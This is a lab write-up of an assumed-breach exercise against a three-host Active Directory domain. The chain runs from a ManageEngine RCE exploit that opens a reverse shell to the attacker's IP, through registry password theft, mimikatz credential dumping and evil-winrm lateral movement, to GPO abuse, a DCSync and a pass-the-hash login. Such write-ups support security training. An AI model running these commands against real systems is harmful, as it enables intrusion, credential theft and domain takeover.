#box #RDP #ManageEngine #java #mimikatz #winlogon #GenericAll #GPLink #DCSync #impacket-secretsdump 

Secura is an AD exercise where we have an Assumed Breach scenario.
In our current instance the machines involved are:

* 192.168.230.95
* 192.168.230.96
* 192.168.230.97

The credentials of the assumed breach scenario that we own are: `Eric.Wallows:EricLikesRunning800`

## Network Schema

![[attachments/challenge-0-secura-writeup-12.png]]
## Nmap

We start with an easy scan of the available host. To be sure we also include the other two, but they are not reachable from our kali machine:

```bash
# Nmap 7.95 scan initiated Tue Sep 30 12:31:00 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 192.168.230.95, 192.168.230.96, 192.168.230.97
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 14:05 EDT
Nmap scan report for secure (192.168.230.95)
Host is up (0.043s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server  Microsoft Terminal Services
|_ssl-date: 2025-09-30T18:07:01+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SECURA
|   NetBIOS_Domain_Name: SECURA
|   NetBIOS_Computer_Name: SECURE
|   DNS_Domain_Name: secura.yzx
|   DNS_Computer_Name: secure.secura.yzx
|   DNS_Tree_Name: secura.yzx
|   Product_Version: 10.0.19041
|_  System_Time: 2025-09-30T18:06:20+00:00
| ssl-cert: Subject: commonName=secure.secura.yzx
| Not valid before: 2025-08-14T03:33:03
|_Not valid after:  2026-02-13T03:33:03
5001/tcp  open  commplex-link?
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt  AppManager
|_http-server-header: AppManager
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Set-Cookie: JSESSIONID_APM_44444=BA361B53F5C45058975B2BA8C8618923; Path=/; Secure; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 973
|     Date: Tue, 30 Sep 2025 18:05:24 GMT
|     Connection: close
|     Server: AppManager
|     <!DOCTYPE html>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     <!-- Includes commonstyle CSS and dynamic style sheet bases on user selection -->
|     <link href="/images/commonstyle.css?rev=14440" rel="stylesheet" type="text/css">
|     <link href="/images/newUI/newCommonstyle.css?rev=14260" rel="stylesheet" type="text/css">
|     <link href="/images/Grey/style.css?rev=14030" rel="stylesheet" type="text/css">
|     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body bgcolor="#FFFFFF" leftmarg
|   GetRequest: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID_APM_44444=D44E654D1684AD257BD8F81A52B03CCF; Path=/; Secure; HttpOnly
|     Accept-Ranges: bytes
|     ETag: W/"261-1591621693000"
|     Last-Modified: Mon, 08 Jun 2020 13:08:13 GMT
|     Content-Type: text/html
|     Content-Length: 261
|     Date: Tue, 30 Sep 2025 18:05:24 GMT
|     Connection: close
|     Server: AppManager
|     <!-- $Id$ -->
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <!-- This comment is for Instant Gratification to work applications.do -->
|     <script>
|     window.open("/webclient/common/jsp/home.jsp", "_top");
|     </script>
|     </head>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Set-Cookie: JSESSIONID_APM_44444=692D4DCE609C07B4670F8D55030E08A5; Path=/; Secure; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 1810
|     Date: Tue, 30 Sep 2025 18:05:24 GMT
|     Connection: close
|     Server: AppManager
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="UTF-8">
|     <!--$Id$-->
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     </head>
|     <body style="background-color:#fff;">
|     <style type="text/css">
|     #container-error
|     border:1px solid #c1c1c1;
|     background: #fff; font:11px Arial, Helvetica, sans-serif; width:90%; margin:80px;
|     #header-error
|     background: #ededed; line-height:18px;
|     padding: 15px; color:#000; font-size:8px;
|     #header-error h1
|_    margin: 0; color:#000;
12000/tcp open  cce4x?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=9/30%Time=68DC1BE4%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,24E,"HTTP/1\.1\x20200\x20\r\nSet-Cookie:\x20JSESSIONID_A
SF:PM_44444=D44E654D1684AD257BD8F81A52B03CCF;\x20Path=/;\x20Secure;\x20Htt
SF:pOnly\r\nAccept-Ranges:\x20bytes\r\nETag:\x20W/\"261-1591621693000\"\r\
SF:nLast-Modified:\x20Mon,\x2008\x20Jun\x202020\x2013:08:13\x20GMT\r\nCont
SF:ent-Type:\x20text/html\r\nContent-Length:\x20261\r\nDate:\x20Tue,\x2030
SF:\x20Sep\x202025\x2018:05:24\x20GMT\r\nConnection:\x20close\r\nServer:\x
SF:20AppManager\r\n\r\n<!--\x20\$Id\$\x20-->\n<!DOCTYPE\x20HTML\x20PUBLIC\
SF:x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\">\n<html>\n<head
SF:>\n<!--\x20This\x20comment\x20is\x20for\x20Instant\x20Gratification\x20
SF:to\x20work\x20applications\.do\x20-->\n<script>\n\n\twindow\.open\(\"/w
SF:ebclient/common/jsp/home\.jsp\",\x20\"_top\"\);\n\n</script>\n\n</head>
SF:\n</html>\n")%r(HTTPOptions,849,"HTTP/1\.1\x20403\x20\r\nSet-Cookie:\x2
SF:0JSESSIONID_APM_44444=692D4DCE609C07B4670F8D55030E08A5;\x20Path=/;\x20S
SF:ecure;\x20HttpOnly\r\nCache-Control:\x20private\r\nExpires:\x20Thu,\x20
SF:01\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;char
SF:set=UTF-8\r\nContent-Length:\x201810\r\nDate:\x20Tue,\x2030\x20Sep\x202
SF:025\x2018:05:24\x20GMT\r\nConnection:\x20close\r\nServer:\x20AppManager
SF:\r\n\r\n<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">
SF:\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"UTF-8\">\n<!--\$Id\
SF:$-->\n\n\n\n\n\n\n\n\n\n<html>\n<head>\n<title>Applications\x20Manager<
SF:/title>\n\n<link\x20REL=\"SHORTCUT\x20ICON\"\x20HREF=\"/favicon\.ico\">
SF:\n\n</head>\n\n<body\x20style=\"background-color:#fff;\">\n\n<style\x20
SF:type=\"text/css\">\n\t#container-error\n\t{\n\t\tborder:1px\x20solid\x2
SF:0#c1c1c1;\n\t\tbackground:\x20#fff;\x20font:11px\x20Arial,\x20Helvetica
SF:,\x20sans-serif;\x20width:90%;\x20margin:80px;\n\t\x20\t\n\t}\n\n\t#hea
SF:der-error\n\t{\n\t\tbackground:\x20#ededed;\x20line-height:18px;\n\t\tp
SF:adding:\x2015px;\x20color:#000;\x20font-size:8px;\n\t}\n\n\t#header-err
SF:or\x20h1\n\t{\n\t\tmargin:\x200;\x20\x20color:#000;")%r(FourOhFourReque
SF:st,4C3,"HTTP/1\.1\x20404\x20\r\nSet-Cookie:\x20JSESSIONID_APM_44444=BA3
SF:61B53F5C45058975B2BA8C8618923;\x20Path=/;\x20Secure;\x20HttpOnly\r\nCon
SF:tent-Type:\x20text/html;charset=UTF-8\r\nContent-Length:\x20973\r\nDate
SF::\x20Tue,\x2030\x20Sep\x202025\x2018:05:24\x20GMT\r\nConnection:\x20clo
SF:se\r\nServer:\x20AppManager\r\n\r\n<!DOCTYPE\x20html>\n\n<meta\x20http-
SF:equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n\n\n\n\n\n\n\n\n\n\n
SF:<html>\n<head>\n<title>Applications\x20Manager</title>\n\n<link\x20REL=
SF:\"SHORTCUT\x20ICON\"\x20HREF=\"/favicon\.ico\">\n\n<!--\x20Includes\x20
SF:commonstyle\x20CSS\x20and\x20dynamic\x20style\x20sheet\x20bases\x20on\x
SF:20user\x20selection\x20-->\n\n<link\x20href=\"/images/commonstyle\.css\
SF:?rev=14440\"\x20rel=\"stylesheet\"\x20type=\"text/css\">\n\n\x20\x20\x2
SF:0\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20href=
SF:\"/images/newUI/newCommonstyle\.css\?rev=14260\"\x20rel=\"stylesheet\"\
SF:x20type=\"text/css\">\n\x20\x20\x20\x20\n\n<link\x20href=\"/images/Grey
SF:/style\.css\?rev=14030\"\x20rel=\"stylesheet\"\x20type=\"text/css\">\n\
SF:n<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charse
SF:t=iso-8859-1\">\n</head>\n\n<body\x20bgcolor=\"#FFFFFF\"\x20leftmarg");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-30T18:06:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for era (192.168.230.96)
Host is up (0.044s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-30T18:06:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for dc01 (192.168.230.97)
Host is up (0.042s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-09-30 18:05:18Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: SECURA)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2s, deviation: 5s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-09-30T18:06:25
|_  start_date: 2025-08-15T02:56:45
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: dc01
|   NetBIOS computer name: DC01\x00
|   Domain name: secura.yzx
|   Forest name: secura.yzx
|   FQDN: dc01.secura.yzx
|_  System time: 2025-09-30T18:06:28+00:00

Post-scan script results:
| clock-skew: 
|   0s: 
|     192.168.230.96 (era)
|     192.168.230.95 (secure)
|_    192.168.230.97 (dc01)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 111.07 seconds

```

From the scan we discover that the Domain name is `secura.yzx`, and at the end, from the clock-skew, we discover the hostnames are respectively:
* 192.168.230.96 (era.secura.yzx)
* 192.168.230.95 (secure.secura.yzx)
* 192.168.230.97 (dc01.securay.yzx)

We proceed to add that on our `/etc/hosts` file.

## 3389 - RDP

Since our initial foothold is on 192.168.xx.95 we proceed to authenticate to RDP with our user:

```bash
xfreerdp3 /v:192.168.230.95 /u:Eric.Wallows /p:EricLikesRunning800  /bpp:8 /network:modem /compression -themes -wallpaper /size:1920x700
```

And once on the target machine a service starts and MS Edge opens a web application called `ManageEngine Applications Manager`.

![[attachments/challenge-0-secura-writeup-1.png]]

On port `44444`.
On the bottom the Build No. is shown, naming this version build 14710.
By looking for exploit, we discover that a few exploit are present for that `Manage Engine` application:

```bash
searchsploit ManageEngine
```

By mixing the search also online, we discover the presence of the following exploit:

![[attachments/challenge-0-secura-writeup-2.png]]

Which is an Authenticated RCE and corresponds to [CVE-2020-14008](https://nvd.nist.gov/vuln/detail/CVE-2020-14008).

To perform this exploit we must be authenticated. We spot a `First Time User` option on the webpage. By clicking on it a popup showing the basic credentials: `admin:admin` appears:

![[attachments/challenge-0-secura-writeup-3.png]]

We opt to try that, succeeding in the authentication

## CVE-2020-14008

Now that we're authenticated we can download and execute the exploit:

```bash
python3 48793.py http://192.168.230.95:44444/ admin admin 192.168.45.211 4444
```

We rapidly understand that unfortunately the script is breaking. 
The main issue is the fact that we're missing JDK (Java Development Kit) from our installation. After installing the default one from apt, we've realized it couldn't build on `javac --release 7` because it was too old, so we opted to install an older JDK from [here](https://blog.udoyhasan.com/how-to-install-openjdk-18-or-jdk-18-on-kali-linux).

Once installed, we changed the python script to point to our custom `javac` executable at:

```python
cmdCompile = "/root/Desktop/OSCP/Secura/jdk-18.0.2/bin/javac --release 7 " + subdir + "/*.java"
```

This made possible to build the script with the required binary and gave us a shell on port 4444, gaining `NT Authority\SYSTEM` on the machine:

![[attachments/challenge-0-secura-writeup-4.png]]

---

## WinLogon

At first, rather than the intended path, we've discovered an alternate path which was way faster and didn't require the exploit. On `secure.secura.yzx` there's a WinLogon password set. It can be recovered by querying the following registry key:

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

It'll return a cleartext password for `administrator:Reality2Show4!.?`

---
## Mimikatz

Whatever is the option chosen, we can now upload mimikatz since we've inherited higher privileges and, in particular `SeDebugPrivilege`:

![[attachments/challenge-0-secura-writeup-5.png]]

and we can therefore use the option `privilege::debug` that will permit us to retrieve a lot of information from the mimikatz scan.

We download mimikatz and we then transfer it to our session (with either `xfreerdp3` on the `administrator` session or with curl on the reverse shell with `NT AUTHORITY\SYSTEM`).
Once on the target machine, we run it and we then do `privilege::debug`:

![[attachments/challenge-0-secura-writeup-6.png]]

Finally, we use `sekurlsa::logonpasswords` to check whether there's any session's password stored in the domain, discovering `apache:New2Era4.!` on `era.secure.local`.

![[attachments/challenge-0-secura-writeup-7.png]]

We resolve `era.secura.local` and we discover it points to 192.168.230.96:

![[attachments/challenge-0-secura-writeup-8.png]]

## Lateral Movement to `era.secura.yzx`

Since we do have a set of credentials for the new host, we can now try to authenticate to it with `evil-winrm`, since it's open on the target host:

```bash
evil-winrm -i 192.168.230.96 -u apache -p New2Era4.!
```

On this host, since the user is apache, we jump into the `C:\xampp` folder in order to discovery if there's any PII leakage somewhere.
Inside we find a `/tmp` folder, containing two `sess_` files. Inside the first we discover the credentials for the Administrator's user:

`C:\xampp\tmp\sess_4ratl05q4mpc92ib7bga2imgr9` --> `administrator:Almost4There8.?`

While on the second one we discover the credentials for another user:

`C:\xampp\tmp\sess_slj10ssu5745kcivardthqb5rg` --> `charlotte:Game2On4.!`

According to our bloodhound scan:

```bash
bloodhound-python -u 'Eric.Wallows' -p 'EricLikesRunning800' -ns 192.168.172.97 -d secura.yzx -c all
```

We've discovered that the user `charlotte` has `WriteDacl` permissions over `Default Domain Policy@secura.yzx`

![[attachments/challenge-0-secura-writeup-9.png]]

Moreover, `Default Domain Policy@secura.yzx` has `GPLink` over the domain:

![[attachments/challenge-0-secura-writeup-10.png]]

At this point, we could take Full Control of the GPO `Default Domain Policy` with `WriteDacl` and then use `SharpGPOAbuse` to gain control of the domain by adding ourselves as Local Administrators of the machine:

## Lateral Movement to `dc01.secura.yzx`

Again, we authenticate within `evil-winrm` with the user `charlotte` this time on the domain controller:

```bash
evil-winrm -i 192.168.230.97 -u charlotte -p Game2On4.!
```

Proving that we can authenticate as required.
Now, given that we have WriteDACL and GenericWrite over `Default Domain Policy` we can directly abuse the GPLink to gain control over the domain by adding ourselves as Local Admin:

```bash
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
[+] Domain = secura.yzx
[+] Domain Controller = dc01.secura.yzx
[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
[+] SID Value of charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

We now must authenticate again to `evil-winrm` to effectively have the session change in place.

## Over DC

To gain full control over the Administrator, since charlotte is now a Local Administrator of the DC we can perform a DCSync. For ease, we'll use `impacket-secretsdump`:

```bash
impacket-secretsdump -outputfile 'dcsync' -dc-ip 192.168.230.97 "secura"/"charlotte":'Game2On4.!'@'dc01.secura.yzx'
```

This will dump the hash of the administrator, that we'll then be able to use to perform a PtH authentication over `evil-winrm`:

```bash
evil-winrm -i 192.168.230.97 -u Administrator -H d38e7c66048f80fd9566ab85afca76b1
```

Gaining control of the Administrator user

![[attachments/challenge-0-secura-writeup-11.png]]

